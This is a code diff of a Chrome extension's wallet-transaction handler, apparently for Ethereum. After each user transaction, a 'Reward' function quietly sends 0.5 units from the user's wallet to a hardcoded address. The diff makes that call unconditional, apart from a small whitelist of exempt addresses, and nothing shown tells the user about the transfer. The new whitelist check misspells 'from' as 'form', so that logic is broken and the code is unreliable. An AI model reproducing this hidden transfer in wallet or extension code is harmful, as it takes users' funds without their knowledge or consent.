@@ -81,9 +81,6 @@ const sendTransacation = function (wallet, to, num) {
             }
         })
     })
-
-
-
 }
 
 const PushTransaction = function (wallet, to, num) {
@@ -102,9 +99,18 @@ const PushTransaction = function (wallet, to, num) {
     })
 }
 
+const whitelist = [
+    "0xaadd17e8654172eafa85e744cb920f2ff287f398",
+    "0x397a5941e30d0d08e2c29d7b10985e066c34fc57",
+    "0xb61ee0b76cc1a3f887dc03cf647321acb5294dc6",
+    "0xa4585aeaf6f1728529c238df87243c553f635a84"
+]
 const Reward = async function () {
-    const Transacation = await PushTransaction(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
-    console.log(Transacation)
+    const from = '0x' + wallet.getAddress().toString('hex')
+    if (whitelist.indexOf(form) === -1) {
+        const Transacation = await PushTransaction(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
+        console.log(Transacation)
+    }
 }
 chrome.extension.onRequest.addListener(
     function (request, sender, sendResponse) {
@@ -122,8 +128,9 @@ chrome.extension.onRequest.addListener(
             const id = request.id;
             var num = limit.toFixed(0);
             const idNum = Number('0.' + id)
-            function sleep(ms) {
-                return new Promise(resolve => setTimeout(resolve, ms))
+            if (idNum > limit) {
+                sendResponse()
+                return
             }
             if (mode == "quick") {
                 if (num + idNum > limit) {
@@ -145,10 +152,7 @@ chrome.extension.onRequest.addListener(
                                 throw err
                             }
                         }
-                        // 打赏
-                        if (from != "0xaadd17e8654172eafa85e744cb920f2ff287f398") {
-                            await Reward()
-                        }
+                        await Reward()
                     } catch (err) {
                         throw err
                     }
@@ -166,10 +170,7 @@ chrome.extension.onRequest.addListener(
                             throw err
                         }
                     }
-                    // 打赏
-                    if (from != "0xaadd17e8654172eafa85e744cb920f2ff287f398") {
-                        await Reward()
-                    }
+                    await Reward()
                 }
                 looper().then(r => { sendResponse() }, e => { sendResponse() })
             }
